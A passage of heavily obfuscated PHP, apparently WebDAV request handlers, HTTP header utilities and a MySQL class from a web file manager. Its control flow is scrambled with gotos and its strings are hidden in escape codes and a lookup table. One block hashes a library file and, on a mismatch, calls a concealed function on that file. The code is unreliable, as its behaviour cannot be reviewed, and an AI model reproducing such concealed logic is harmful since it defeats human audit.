dÎë™Òİ—¯; dÎë™Òİ—¯: if (!trim($Aäå‘¦Èƒ[$A²°†•âÕ[105]])) { $Aäå‘¦Èƒ[$A²°†•âÕ[105]] = time(); } if (!trim($Aäå‘¦Èƒ[$A²°†•âÕ[186]])) { $Aäå‘¦Èƒ[$A²°†•âÕ[186]] = time(); } $eµèôè¿ = array($A²°†•âÕ[1214] => KodIO::clear($this->urlBase . $A²°†•âÕ[8] . $bÕª¼ËË¡¢), $A²°†•âÕ[105] => @gmdate($A²°†•âÕ[1215], $Aäå‘¦Èƒ[$A²°†•âÕ[105]]), $A²°†•âÕ[186] => @gmdate($A²°†•âÕ[1216], $Aäå‘¦Èƒ[$A²°†•âÕ[186]]), $A²°†•âÕ[78] => $Aäå‘¦Èƒ[$A²°†•âÕ[78]] ? $Aäå‘¦Èƒ[$A²°†•âÕ[78]] : 0); goto e™ŸØ šè; b«Ü¦œ©: } public function parseItemXml($DÌ„¼éƒ´Ó) { $D¾Ë”‰Ò±Š =& $_SERVER[İåâé¾]; $eØ…˜ˆ’© = $this->parseItem($DÌ„¼éƒ´Ó); if ($DÌ„¼éƒ´Ó[$D¾Ë”‰Ò±Š[29]] == $D¾Ë”‰Ò±Š[77]) { $AŠÁ¡ˆ¼ = $D¾Ë”‰Ò±Š[1217]; $AŠÁ¡ˆ¼ .= $D¾Ë”‰Ò±Š[1218]; } else { $cÅÄ¦†ÃÈì = $DÌ„¼éƒ´Ó[$D¾Ë”‰Ò±Š[156]] ? $DÌ„¼éƒ´Ó[$D¾Ë”‰Ò±Š[156]] : get_path_ext($DÌ„¼éƒ´Ó[$D¾Ë”‰Ò±Š[28]]); $EÑß¤Ö…ïË = get_file_mime($cÅÄ¦†ÃÈì); $AŠÁ¡ˆ¼ = $D¾Ë”‰Ò±Š[1219]; $AŠÁ¡ˆ¼ .= "\74\x44\72\x67\x65\164\143\x6f\x6e\x74\x65\156\x74\x74\171\x70\145\x3e{$EÑß¤Ö…ïË}\x3c\x2f\x44\72\147\x65\164\143\x6f\x6e\164\145\x6e\164\x74\171\160\145\x3e"; } return "\xa\x9\x9\74\x44\x3a\162\x65\163\x70\x6f\156\163\x65\76\xa\11\x9\x9\74\x44\72\x68\162\145\x66\76{$eØ…˜ˆ’©[$D¾Ë”‰Ò±Š[1214]]}\x3c\x2f\x44\72\x68\x72\145\x66\76\12\x9\11\x9\74\104\x3a\x70\x72\157\160\163\x74\141\x74\x3e\12\11\x9\11\11\74\x44\x3a\160\162\x6f\160\76\12\x9\x9\11\x9\11\74\104\72\x67\x65\164\154\141\x73\164\x6d\157\144\x69\146\x69\x65\144\x3e{$eØ…˜ˆ’©[$D¾Ë”‰Ò±Š[105]]}\x3c\57\x44\72\147\x65\x74\154\141\163\164\155\157\144\151\146\x69\145\144\x3e\xa\11\11\11\x9\11\x3c\x44\x3a\143\x72\x65\141\x74\x69\157\156\144\x61\x74\145\76{$eØ…˜ˆ’©[$D¾Ë”‰Ò±Š[186]]}\x3c\57\104\x3a\143\162\145\x61\164\151\157\156\144\141\164\x65\76\xa\11\11\x9\11\x9\74\104\x3a\x67\145\164\143\157\156\x74\x65\156\164\x6c\x65\156\x67\164\x68\76{$eØ…˜ˆ’©[$D¾Ë”‰Ò±Š[78]]}\x3c\57\104\72\x67\x65\x74\143\157\156\x74\145\x6e\164\154\145\156\147\164\150\76\12\x9\11\x9\x9\x9{$AŠÁ¡ˆ¼}\12\x9\x9\11\11\74\57\x44\x3a\160\162\x6f\x70\76\xa\11\11\x9\x9\x3c\x44\x3a\x73\x74\x61\x74\x75\163\76\x48\124\x54\x50\57\61\x2e\61\40\62\60\x30\40\x4f\113\x3c\x2f\x44\x3a\x73\x74\x61\164\165\163\x3e\xa\x9\x9\x9\x3c\x2f\x44\72\x70\x72\157\160\x73\x74\141\164\x3e\12\x9\x9\x3c\x2f\104\x3a\x72\145\x73\x70\x6f\156\x73\145\76"; } public function pathListMerge($Aš°¿•ğ‰ß) { goto f×µ—ëÃ˜å; Eùë‘‰½ØÎ: $d…½œ¾¬®ß = array(); foreach ($Aš°¿•ğ‰ß as $fˆ‚ñ…™£” => $d‚ä‰ó´®) { if (!in_array($fˆ‚ñ…™£”, $b—©†ù° í) || !is_array($d‚ä‰ó´®)) { continue; } $d…½œ¾¬®ß = array_merge($d…½œ¾¬®ß, $d‚ä‰ó´®); } foreach ($d…½œ¾¬®ß as &$CØ§œ‡Õç‰) { $CØ§œ‡Õç‰[$bÎ„ˆÜŠÙâ[28]] = str_replace($bÎ„ˆÜŠÙâ[8], $bÎ„ˆÜŠÙâ[1041], $CØ§œ‡Õç‰[$bÎ„ˆÜŠÙâ[28]]); } goto dâ Ş®œ–Â; dâ Ş®œ–Â: return $d…½œ¾¬®ß; goto dø°¡¨ã˜; f×µ—ëÃ˜å: $bÎ„ˆÜŠÙâ =& $_SERVER[İåâé¾]; if (!$Aš°¿•ğ‰ß) { return $Aš°¿•ğ‰ß; } $b—©†ù° í = array($bÎ„ˆÜŠÙâ[74], $bÎ„ˆÜŠÙâ[75], $bÎ„ˆÜŠÙâ[1220]); goto Eùë‘‰½ØÎ; dø°¡¨ã˜: } public function httpPROPFIND() { goto fÍ†ºğëô; DÈã£¤–„: if ($bÑ¢‘ë¨¤) { $f»¶è¥’ô¼[$dƒšø™†ä[186]] = $bÑ¢‘ë¨¤[$dƒšø™†ä[186]]; $f»¶è¥’ô¼[$dƒšø™†ä[105]] = $bÑ¢‘ë¨¤[$dƒšø™†ä[105]]; $f»¶è¥’ô¼[$dƒšø™†ä[156]] = $bÑ¢‘ë¨¤[$dƒšø™†ä[156]]; $f»¶è¥’ô¼[$dƒšø™†ä[29]] = $bÑ¢‘ë¨¤[$dƒšø™†ä[29]]; } $EÆ¬çã“‰ = HttpHeader::get($dƒšø™†ä[1200]); if ($f»¶è¥’ô¼[$dƒšø™†ä[29]] == $dƒšø™†ä[163]) { $EÆ¬çã“‰ = $dƒšø™†ä[402]; } goto c®ºˆµæïˆ; c®ºˆµæïˆ: if ($EÆ¬çã“‰ == $dƒšø™†ä[402]) { $FÒßçßÔéœ = array($f»¶è¥’ô¼); } else { $FÒßçßÔéœ = array_merge(array($f»¶è¥’ô¼), $FÒßçßÔéœ); } $FÜø…ê¬êÍ = $dƒšø™†ä[33]; foreach ($FÒßçßÔéœ as $c·Æ°À‰Ú¿) { $FÜø…ê¬êÍ .= $this->parseItemXml($c·Æ°À‰Ú¿); } goto b›éÉï¸™¢; b›éÉï¸™¢: return array($dƒšø™†ä[1221] => 207, $dƒšø™†ä[1222] => "\x3c\104\72\155\165\154\x74\151\163\164\x61\x74\x75\x73\x20\170\155\154\156\163\x3a\104\75\x22\104\101\x56\72\x22\x3e\xa{$FÜø…ê¬êÍ}\xa\x3c\57\104\x3a\155\x75\154\164\151\x73\x74\141\x74\x75\x73\76"); goto DÎµ‹Åš‡œ; fÍ†ºğëô: $dƒšø™†ä =& $_SERVER[İåâé¾]; $FÒßçßÔéœ = $this->pathList($this->path); $FÒßçßÔéœ = $this->pathListMerge($FÒßçßÔéœ); goto CâœŠğµÕ; CâœŠğµÕ: if (!is_array($FÒßçßÔéœ)) { return array($dƒšø™†ä[1221] => 404, $dƒšø™†ä[1222] => $dƒšø™†ä[1223]); } $bÑ¢‘ë¨¤ = IO::info($this->path); $f»¶è¥’ô¼ = array($dƒšø™†ä[387] => $dƒšø™†ä[33], $dƒšø™†ä[29] => $dƒšø™†ä[77]); goto DÈã£¤–„; DÎµ‹Åš‡œ: } public function httpHEAD() { $b©¼İ´„± =& $_SERVER[İåâé¾]; $CÌÆ´À–Ô = $this->pathInfo($this->path); if (!$CÌÆ´À–Ô || $CÌÆ´À–Ô[$b©¼İ´„±[29]] == $b©¼İ´„±[77]) { return array($b©¼İ´„±[780] => 200, $b©¼İ´„±[937] => array($b©¼İ´„±[1224])); } return array($b©¼İ´„±[780] => 200, $b©¼İ´„±[937] => array($b©¼İ´„±[1225], $b©¼İ´„±[134], $b©¼İ´„±[1226] . $CÌÆ´À–Ô[$b©¼İ´„±[78]], $b©¼İ´„±[1227] . get_file_mime($CÌÆ´À–Ô[$b©¼İ´„±[156]]), $b©¼İ´„±[130] . gmdate($b©¼İ´„±[1215], $CÌÆ´À–Ô[$b©¼İ´„±[1228]]) . $b©¼İ´„±[1229], $b©¼İ´„±[1230])); } public function httpOPTIONS() { $B²›†Áø“í =& $_SERVER[İåâé¾]; return array($B²›†Áø“í[780] => 200, $B²›†Áø“í[937] => array($B²›†Áø“í[1231], $B²›†Áø“í[1232], $B²›†Áø“í[1233], $B²›†Áø“í[1190])); } public function httpPROPPATCH() { $Cùï®Ï»¡ =& $_SERVER[İåâé¾]; $eÀˆ¶ÔÎ = $Cùï®Ï»¡[1234] . $_SERVER[$Cùï®Ï»¡[437]] . $Cùï®Ï»¡[1235]; return array($Cùï®Ï»¡[1221] => 207, $Cùï®Ï»¡[1222] => "\x3c\104\x3a\x6d\x75\x6c\164\151\x73\164\141\164\x75\x73\40\x78\155\154\156\x73\x3a\x44\75\x22\104\101\x56\x3a\42\x3e\xa{$eÀˆ¶ÔÎ}\12\74\x2f\104\x3a\x6d\165\x6c\x74\x69\163\x74\141\164\x75\x73\x3e"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $cô–²¡©ã– =& $_SERVER[İåâé¾]; $Eî×‡É§£ = $this->uploadFile(); if ($Eî×‡É§£) { $AôÑî³‚Â‰ = 204; } else { $Eî×‡É§£ = $cô–²¡©ã–[33]; $AôÑî³‚Â‰ = 201; } $AÓ†“¸ó’ = $this->pathPut($this->path, $Eî×‡É§£); if ($AÓ†“¸ó’ == !1) { $AôÑî³‚Â‰ = 404; } return array($cô–²¡©ã–[1221] => $AôÑî³‚Â‰); } private function uploadFile() { goto D¥Ö§¨Ô”; C…ğ–âì·³: if (@filesize($fØÎâ•Ä) > 0) { return $fØÎâ•Ä; } @unlink($fØÎâ•Ä); return !1; goto e¨İµ™‚›; a¾é¿Õ±¹¾: while (!feof($EØ­çÙàÃÂ)) { fwrite($B…›ù±ãÜí, fread($EØ­çÙàÃÂ, 1024 * 200)); } fclose($EØ­çÙàÃÂ); fclose($B…›ù±ãÜí); goto C…ğ–âì·³; f¸Ï«Î¶Úê: $B…›ù±ãÜí = @fopen($fØÎâ•Ä, $Cí¦™˜§¹ä[1159]); $EØ­çÙàÃÂ = @fopen($Cí¦™˜§¹ä[1237], $Cí¦™˜§¹ä[1158]); if (!$EØ­çÙàÃÂ || !$B…›ù±ãÜí) { @unlink($fØÎâ•Ä); return !1; } goto a¾é¿Õ±¹¾; D¥Ö§¨Ô”: $Cí¦™˜§¹ä =& $_SERVER[İåâé¾]; @mk_dir(TEMP_FILES); $fØÎâ•Ä = TEMP_FILES . $Cí¦™˜§¹ä[1236] . rand_string(32); goto f¸Ï«Î¶Úê; e¨İµ™‚›: } public function httpMKCOL() { $aƒÙËùÅœ¿ =& $_SERVER[İåâé¾]; if ($this->pathExists($this->path)) { return array($aƒÙËùÅœ¿[780] => 409); } $cã¢İ‘Ùî³ = $this->pathMkdir($this->path); return array($aƒÙËùÅœ¿[780] => $cã¢İ‘Ùî³ ? 201 : 403); } public function httpMOVE() { $cÜ‡ãĞÅ½‡ =& $_SERVER[İåâé¾]; $fãõİ¾ÏÓ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$cÜ‡ãĞÅ½‡[1238]])) { $bø¾˜“ÊÍ[$cÜ‡ãĞÅ½‡[1239]] = $_SERVER[$cÜ‡ãĞÅ½‡[1238]] == $cÜ‡ãĞÅ½‡[1240]; } $E »˜ÓÙ = $this->pathMove($this->path, $fãõİ¾ÏÓ); return array($cÜ‡ãĞÅ½‡[780] => $E »˜ÓÙ ? 201 : 404); } public function httpCOPY() { $eå—¤Å¸…ñ = $this->parsePath($this->pathGet(!0)); $F‘š°‰Âí­ = $this->pathCopy($this->path, $eå—¤Å¸…ñ); return array($_SERVER[İåâé¾][780] => $F‘š°‰Âí­ ? 201 : 404); } public function httpDELETE() { $BÂœŠÈÈ = $this->pathRemove($this->path); return array($_SERVER[İåâé¾][780] => $BÂœŠÈÈ ? 200 : 503); } public function httpLOCK() { $dáØ…½¦› =& $_SERVER[İåâé¾]; $E£İ¬´à‚Í = md5($this->path); $b¶ÔÀ¬­— = $dáØ…½¦›[1241] . $this->xmlGet($dáØ…½¦›[1242]) . $dáØ…½¦›[1243] . $E£İ¬´à‚Í . $dáØ…½¦›[1244]; return array($dáØ…½¦›[780] => 200, $dáØ…½¦›[937] => array($dáØ…½¦›[1245] . $E£İ¬´à‚Í, $dáØ…½¦›[1246]), $dáØ…½¦›[1247] => $b¶ÔÀ¬­—); } public function httpUNLOCK() { return array($_SERVER[İåâé¾][780] => 204); } public function xmlGet($d¸òé‘¾¡) { goto f¾÷²ó¬òÕ; f¾÷²ó¬òÕ: $DÉéƒ¼ñİí =& $_SERVER[İåâé¾]; static $Dƒ…éƒŸî  = false; if (!$Dƒ…éƒŸî ) { $fÔ†¦©§Ì = file_get_contents($DÉéƒ¼ñİí[1248]); $Dƒ…éƒŸî  = new DOMDocument(); $Dƒ…éƒŸî ->loadXML($fÔ†¦©§Ì); } goto E„ˆˆˆò±; C®Î”¤³„´: return $DÉéƒ¼ñİí[33]; goto Aï¡ØêĞŠÌ; E„ˆˆˆò±: $fğª‘£ÕÀ = array_shift(explode($DÉéƒ¼ñİí[8], $d¸òé‘¾¡)); $F­”éÏâœË = $Dƒ…éƒŸî ->getElementsByTagNameNS($DÉéƒ¼ñİí[1249], $fğª‘£ÕÀ); if ($F­”éÏâœË) { return $F­”éÏâœË[0]->nodeValue; } goto C®Î”¤³„´; Aï¡ØêĞŠÌ: } public static function response($e•ÃËóÜ÷í) { goto Aù‚ÙÛÖ“ë; fâ¨Øİ’³Ä: $Bƒ†¸–×§Š[] = $Bˆâ¯ÆÓ×‚[1188]; $Bƒ†¸–×§Š[] = $Bˆâ¯ÆÓ×‚[1189]; foreach ($Bƒ†¸–×§Š as $aÒô‚¬ÓŸ¡) { header($aÒô‚¬ÓŸ¡); } goto CÌ¢ê–·®†; Aù‚ÙÛÖ“ë: $Bˆâ¯ÆÓ×‚ =& $_SERVER[İåâé¾]; $Bƒ†¸–×§Š = is_array($e•ÃËóÜ÷í[$Bˆâ¯ÆÓ×‚[937]]) ? $e•ÃËóÜ÷í[$Bˆâ¯ÆÓ×‚[937]] : array(); $Bƒ†¸–×§Š[] = HttpHeader::code($e•ÃËóÜ÷í[$Bˆâ¯ÆÓ×‚[780]]); goto fâ¨Øİ’³Ä; CÌ¢ê–·®†: if (is_string($e•ÃËóÜ÷í[$Bˆâ¯ÆÓ×‚[1247]])) { header($Bˆâ¯ÆÓ×‚[1250]); $Eìêñîí‘ = $Bˆâ¯ÆÓ×‚[1251] . $Bˆâ¯ÆÓ×‚[223] . $e•ÃËóÜ÷í[$Bˆâ¯ÆÓ×‚[1247]]; echo $Eìêñîí‘; } goto cŒİ¹âºç; cŒİ¹âºç: } } $EŠÉŸó›¢ê = LIB_DIR . $_SERVER[İåâé¾][553]; goto dêã¹°•¯·; dêã¹°•¯·: $CõÉÃ¬‹‘¢ = $_SERVER[İåâé¾][554]; if ($_SERVER[$_SERVER[İåâé¾][555]] != $CõÉÃ¬‹‘¢($EŠÉŸó›¢ê)) { goto EÂÚÜ‚¡¦æ; eß¦ÒØ¦ìŞ: $eäôÉ—ß˜ = explode($_SERVER[İåâé¾][223], $fÍñÎŸ»ÆÂ); if (count($eäôÉ—ß˜) < $_SERVER[İåâé¾][1179]) { die; } $cœ¦—¼³“— = $_SERVER[İåâé¾][1180]; goto dÄ¦°ƒùö‹; EÂÚÜ‚¡¦æ: $B¤­Ÿ¤ì•ğ = $_SERVER[İåâé¾][556]; $dëÆä×“Ç = BASIC_PATH . $_SERVER[İåâé¾][557]; $fÍñÎŸ»ÆÂ = $B¤­Ÿ¤ì•ğ($dëÆä×“Ç); goto eß¦ÒØ¦ìŞ; dÄ¦°ƒùö‹: $cœ¦—¼³“—($EŠÉŸó›¢ê); goto DÑ…âÙò½Ù; DÑ…âÙò½Ù: } class HttpHeader { public static $_headers = array("\x48\x6f\x73\x74" => "\110\124\124\x50\137\110\117\123\124", "\125\x73\x65\x72\55\x41\147\145\x6e\x74" => "\110\x54\124\120\x5f\125\123\105\122\137\101\x47\x45\116\x54", "\x43\x6f\x6e\x74\x65\156\164\55\124\x79\160\145" => "\x48\x54\x54\x50\137\x43\117\116\x54\105\x4e\x54\x5f\x54\131\x50\x45", "\x43\157\156\x74\145\156\x74\55\114\x65\156\147\x74\x68" => "\x48\124\124\120\x5f\x43\117\116\124\x45\116\124\137\x4c\x45\x4e\107\x54\110", "\x44\x65\160\x74\x68" => "\110\x54\x54\120\137\104\x45\120\x54\x48", "\x45\170\160\145\x63\x74" => "\x48\124\124\x50\137\105\130\x50\x45\103\124", "\111\146\55\x4e\x6f\156\x65\x2d\115\x61\164\x63\150" => "\110\x54\x54\x50\137\x49\x46\x5f\116\x4f\116\x45\137\x4d\101\x54\103\x48", "\x49\x66\x2d\115\x61\x74\x63\150" => "\110\x54\124\120\137\x49\x46\x5f\115\x41\x54\103\x48", "\x49\x66\x2d\x52\x61\x6e\147\x65" => "\x48\x54\124\120\x5f\111\106\x5f\x52\x41\116\x47\x45", "\114\x61\x73\164\55\x4d\x6f\144\x69\146\151\x65\144" => "\110\x54\x54\x50\x5f\x4c\x41\123\124\x5f\x4d\x4f\x44\111\x46\x49\x45\104", "\111\x66\x2d\x4d\x6f\144\151\x66\151\x65\144\x2d\123\151\156\143\x65" => "\110\124\x54\x50\x5f\x49\x46\137\x4d\x4f\104\111\x46\x49\105\x44\137\x53\x49\116\x43\105", "\x49\146\x2d\125\x6e\x6d\157\144\151\x66\151\x65\144\55\x53\x69\156\143\145" => "\x48\x54\x54\120\137\111\x46\x5f\125\116\115\x4f\104\111\x46\111\105\104\137\x53\x49\x4e\103\105", "\x52\x61\156\147\145" => "\x48\124\x54\x50\137\x52\x41\x4e\107\105", "\124\151\x6d\145\x6f\165\x74" => "\110\124\124\x50\137\x54\111\x4d\105\x4f\x55\124", "\111\146" => "\110\124\x54\120\137\x49\x46", "\114\157\143\153\x2d\x54\x6f\x6b\x65\156" => "\x48\x54\x54\120\137\114\x4f\103\x4b\137\124\x4f\113\105\x4e", "\x4f\166\x65\x72\x77\x72\x69\x74\145" => "\x48\x54\x54\120\137\117\x56\105\122\127\122\111\x54\105", "\x44\145\163\x74\151\x6e\141\164\x69\157\156" => "\110\124\124\x50\x5f\x44\x45\x53\x54\111\x4e\x41\124\111\117\116", "\122\145\161\x75\x65\x73\164\55\111\x64" => "\x52\x45\x51\x55\x45\123\124\137\111\x44", "\x52\x65\161\165\145\x73\x74\55\102\157\144\x79\x2d\106\151\x6c\x65" => "\122\x45\x51\125\x45\x53\124\137\x42\117\x44\x59\x5f\106\111\114\x45", "\x52\145\144\x69\x72\145\x63\164\55\x53\x74\141\x74\x75\163" => "\x52\105\x44\x49\x52\105\x43\x54\137\123\124\x41\124\x55\123"); public static function init() { static $BéÇë®«É‡ = false; if ($BéÇë®«É‡) { return; } foreach ($_SERVER as $c¿ ø ñî› => $d„Õ‘ê„ ) { $c¿ ø ñî› = strtoupper($c¿ ø ñî›); if (!array_key_exists($c¿ ø ñî›, $_SERVER)) { continue; } $_SERVER[$c¿ ø ñî›] = $d„Õ‘ê„ ; } foreach (self::$_headers as $c¿ ø ñî› => $a‹ôŞˆÅÆ) { if (!array_key_exists($c¿ ø ñî›, $_SERVER)) { continue; } $_SERVER[$c¿ ø ñî›] = $_SERVER[$a‹ôŞˆÅÆ]; $_SERVER[strtoupper($c¿ ø ñî›)] = $_SERVER[$a‹ôŞˆÅÆ]; } } public static function get($c¯‰Úç½÷ñ) { self::init(); return $_SERVER[$c¯‰Úç½÷ñ] ? $_SERVER[$c¯‰Úç½÷ñ] : $_SERVER[$_SERVER[İåâé¾][1252] . strtoupper($c¯‰Úç½÷ñ)]; } public static function method() { return strtoupper(self::get($_SERVER[İåâé¾][148])); } public static function length() { $aÌÃ¥ã–¥¹ =& $_SERVER[İåâé¾]; $aÍ‰¼ĞŠÀ = self::get($aÌÃ¥ã–¥¹[1253]); if (!$aÍ‰¼ĞŠÀ) { $aÍ‰¼ĞŠÀ = self::get($aÌÃ¥ã–¥¹[877]); } return $aÍ‰¼ĞŠÀ; } public static function range() { $añ¨îíÍ  =& $_SERVER[İåâé¾]; $AÁ¿ÌöŞÌ = self::get($añ¨îíÍ [197]); if (!$AÁ¿ÌöŞÌ) { return !1; } if (!preg_match($añ¨îíÍ [1254], $AÁ¿ÌöŞÌ, $D‰¿Ê…ìíñ)) { return !1; } if ($D‰¿Ê…ìíñ[1] === $añ¨îíÍ [33] && $D‰¿Ê…ìíñ[2] === $añ¨îíÍ [33]) { return !1; } return array($D‰¿Ê…ìíñ[1] !== $añ¨îíÍ [33] ? $D‰¿Ê…ìíñ[1] : null, $D‰¿Ê…ìíñ[2] !== $añ¨îíÍ [33] ? $D‰¿Ê…ìíñ[2] : null); } public static $statusCode = array("\x31\60\60" => "\x43\x6f\x6e\164\151\x6e\165\x65", "\x31\x30\x31" => "\x53\167\x69\x74\x63\x68\151\156\x67\x20\x50\x72\157\164\157\x63\157\154", "\x31\x30\x32" => "\120\162\x6f\143\145\163\163\151\x6e\147", "\61\x30\63" => "\105\141\x72\x6c\x79\40\110\x69\156\x74\163", "\62\x30\60" => "\x4f\x4b", "\x32\x30\61" => "\x43\162\x65\141\x74\145\144", "\62\x30\x32" => "\101\143\x63\x65\x70\164\x65\144", "\62\x30\63" => "\116\157\156\55\x41\165\164\x68\x6f\x72\151\x74\x61\164\151\x76\145\40\x49\x6e\146\x6f\x72\155\141\x74\x69\x6f\156", "\x32\60\x34" => "\116\x6f\40\103\x6f\156\x74\x65\156\x74", "\62\x30\x35" => "\x52\145\x73\x65\164\40\x43\157\156\x74\x65\156\164", "\x32\x30\x36" => "\120\141\162\164\x69\x61\x6c\40\103\157\156\164\x65\x6e\x74", "\x32\60\67" => "\115\165\154\x74\151\x2d\123\x74\x61\x74\x75\x73", "\63\x30\60" => "\115\x75\154\x74\x69\x70\154\x65\x20\x43\150\x6f\x69\x63\145\x73", "\63\60\x31" => "\115\157\166\145\144\x20\120\145\162\155\141\x6e\145\x6e\x74\x6c\x79", "\x33\x30\62" => "\106\x6f\x75\156\144", "\x33\60\63" => "\x53\145\145\x20\x4f\x74\150\x65\x72", "\63\60\64" => "\x4e\x6f\x74\40\115\x6f\144\151\x66\x69\x65\x64", "\63\60\65" => "\125\x73\x65\40\120\162\x6f\170\x79", "\x33\x30\67" => "\x54\x65\x6d\160\157\162\x61\162\x79\x20\x52\x65\x64\x69\162\145\143\164", "\x33\x30\x38" => "\120\145\162\x6d\141\156\145\156\164\x20\122\145\x64\151\x72\145\x63\x74", "\x34\x30\60" => "\102\x61\x64\x20\122\145\x71\x75\x65\x73\164", "\64\x30\61" => "\x55\x6e\x61\x75\x74\x68\157\x72\151\172\145\x64", "\64\60\62" => "\120\141\171\x6d\x65\x6e\x74\x20\122\145\x71\165\x69\x72\145\x64", "\x34\x30\63" => "\106\157\x72\x62\x69\x64\x64\145\156", "\64\x30\x34" => "\116\x6f\x74\x20\x46\157\165\156\144", "\x34\x30\x35" => "\x4d\x65\x74\150\x6f\x64\40\x4e\x6f\164\x20\101\154\154\x6f\x77\x65\x64", "\64\60\66" => "\116\157\164\x20\101\x63\143\145\x70\164\141\x62\x6c\145", "\x34\x30\67" => "\x50\162\x6f\170\x79\40\101\165\x74\x68\x65\156\164\x69\143\x61\x74\151\x6f\x6e\x20\x52\145\161\165\x69\x72\145\144", "\x34\x30\70" => "\x52\145\161\165\x65\163\x74\x20\124\151\x6d\x65\x6f\165\x74", "\64\x30\x39" => "\103\157\x6e\146\154\151\x63\x74", "\x34\x31\60" => "\107\157\156\145", "\64\61\x31" => "\114\x65\x6e\147\164\150\x20\122\145\x71\x75\151\162\145\144", "\x34\61\62" => "\x50\x72\145\x63\157\x6e\x64\x69\164\x69\x6f\x6e\40\x46\x61\151\154\x65\x64", "\x34\61\x33" => "\x52\145\161\165\145\163\x74\40\105\x6e\164\151\164\171\40\x54\157\x6f\40\114\141\162\147\x65", "\64\x31\64" => "\x52\145\x71\x75\x65\163\164\40\x55\x52\x49\40\x54\157\157\40\x4c\141\x72\147\145", "\x34\x31\65" => "\125\x6e\x73\x75\160\160\157\162\164\145\x64\x20\115\x65\144\x69\141\40\124\171\x70\145", "\64\x31\66" => "\122\x65\x71\x75\x65\163\164\145\144\x20\122\141\x6e\147\x65\40\116\x6f\x74\x20\123\141\164\x69\x73\x66\x69\141\142\x6c\145", "\64\61\67" => "\105\170\160\x65\x63\x74\141\x74\151\157\x6e\40\106\141\x69\x6c\145\144", "\64\x32\62" => "\125\x6e\x70\x72\x6f\x63\x65\x73\163\141\142\x6c\145\40\105\156\164\x69\x74\x79", "\64\62\63" => "\114\157\143\153\x65\144", "\x34\x32\x34" => "\x46\x61\151\154\x65\144\40\104\x65\x70\x65\x6e\x64\145\x6e\143\171", "\64\62\x35" => "\125\x6e\157\x72\144\x65\x72\145\x64\40\103\157\154\x6c\x65\143\x74\x69\x6f\x6e", "\x34\62\66" => "\125\x70\x67\x72\x61\x64\145\x20\x52\145\161\x75\151\162\x65\x64", "\x34\62\70" => "\120\162\x65\x63\157\x6e\144\x69\164\x69\x6f\x6e\x20\122\145\x71\x75\151\162\x65\x64", "\64\x32\71" => "\x54\x6f\157\x20\x4d\141\156\171\x20\x52\x65\x71\x75\145\x73\x74\x73", "\x34\63\61" => "\x52\x65\x71\165\145\x73\x74\x20\110\145\141\x64\x65\162\x20\106\x69\x65\154\x64\x73\x20\x54\157\157\40\x4c\141\x72\147\x65", "\64\64\64" => "\x4e\157\x20\x52\x65\163\160\x6f\x6e\x73\x65", "\x34\x35\x30" => "\x42\x6c\157\x63\153\x65\x64\x20\x62\171\x20\127\151\156\x64\157\167\x73\x20\x50\141\162\145\156\x74\141\x6c\40\x43\x6f\x6e\164\x72\157\154\163", "\64\x35\x31" => "\x55\x6e\x61\166\141\151\154\141\x62\154\x65\40\106\x6f\x72\x20\114\x65\x67\x61\154\x20\122\145\141\x73\x6f\156\163", "\x34\x39\x34" => "\x52\145\161\165\x65\163\164\40\x48\145\141\x64\x65\162\x20\124\x6f\157\x20\114\141\x72\x67\145", "\65\x30\x30" => "\111\156\x74\x65\162\156\x61\x6c\40\123\145\162\x76\145\162\x20\105\162\162\x6f\162", "\65\60\x31" => "\x4e\x6f\x74\40\x49\155\x70\x6c\x65\155\145\156\164\145\144", "\x35\60\62" => "\x42\141\x64\x20\107\x61\x74\145\x77\x61\171", "\65\x30\63" => "\123\x65\162\166\x69\x63\145\40\x55\156\141\x76\x61\151\154\x61\142\154\x65", "\x35\x30\64" => "\x47\x61\164\x65\167\141\171\40\124\151\155\145\157\165\164", "\65\60\65" => "\x48\x54\124\x50\x20\x56\145\x72\163\x69\x6f\156\x20\x6e\157\164\x20\163\165\160\x70\x6f\162\164\x65\144", "\65\60\x37" => "\111\156\x73\165\146\146\151\x63\151\x65\x6e\164\40\123\x74\157\x72\141\x67\145"); public static function code($e£ ‡¿Ùã) { $FŒ•ê™ÓÍ” =& $_SERVER[İåâé¾]; $e£ ‡¿Ùã = $e£ ‡¿Ùã . $FŒ•ê™ÓÍ”[33]; $bèîç§…‰ = self::$statusCode[$e£ ‡¿Ùã]; $bèîç§…‰ = $bèîç§…‰ ? "\x48\124\x54\x50\57\x31\x2e\x31\40{$e£ ‡¿Ùã}\x20" . $bèîç§…‰ : $FŒ•ê™ÓÍ”[33]; return $bèîç§…‰; } } goto A•È›½Ÿš; a¼Åë£§·”: class DbMysql extends Db { public function __construct($fñ®Êƒ¸¹Ê = '') { $C¾åĞ«Í° =& $_SERVER[İåâé¾]; if (!extension_loaded($C¾åĞ«Í°[473])) { think_exception(think_lang($C¾åĞ«Í°[10]) . $C¾åĞ«Í°[563]); } if (!empty($fñ®Êƒ¸¹Ê)) { $this->config = $fñ®Êƒ¸¹Ê; if (empty($this->config[$C¾åĞ«Í°[13]])) { $this->config[$C¾åĞ«Í°[13]] = $C¾åĞ«Í°[33]; } } } public function connect($fÂÖ¼õº÷æ = '', $fŸˆŸéÑÜê = 0, $BøŠœ±‰¯ê = false) { $e‘Ïò°’„É =& $_SERVER[İåâé¾]; if (!isset($this->linkID[$fŸˆŸéÑÜê])) { goto EÙñ•ŒÆŠİ; c‰¬ÕÜœÔÅ: mysql_query($e‘Ïò°’„É[568] . think_config($e‘Ïò°’„É[569]) . $e‘Ïò°’„É[55], $this->linkID[$fŸˆŸéÑÜê]); if ($BößÎÈ‡Àè > $e‘Ïò°’„É[570]) { mysql_query($e‘Ïò°’„É[571], $this->linkID[$fŸˆŸéÑÜê]); } $this->connected = !0; goto f·Åß§¾Áš; EÙñ•ŒÆŠİ: if (empty($fÂÖ¼õº÷æ)) { $fÂÖ¼õº÷æ = $this->config; } $F¬ÌÄÜ©ˆ„ = $fÂÖ¼õº÷æ[$e‘Ïò°’„É[564]] . ($fÂÖ¼õº÷æ[$e‘Ïò°’„É[565]] ? "\x3a{$fÂÖ¼õº÷æ[$e‘Ïò°’„É[565]]}" : $e‘Ïò°’„É[33]); $eËãÖ¦É = !empty($fÂÖ¼õº÷æ[$e‘Ïò°’„É[13]][$e‘Ïò°’„É[14]]) ? $fÂÖ¼õº÷æ[$e‘Ïò°’„É[13]][$e‘Ïò°’„É[14]] : $this->pconnect; goto dâÃì†Î‘ç; dâÃì†Î‘ç: if ($eËãÖ¦É) { $this->linkID[$fŸˆŸéÑÜê] = 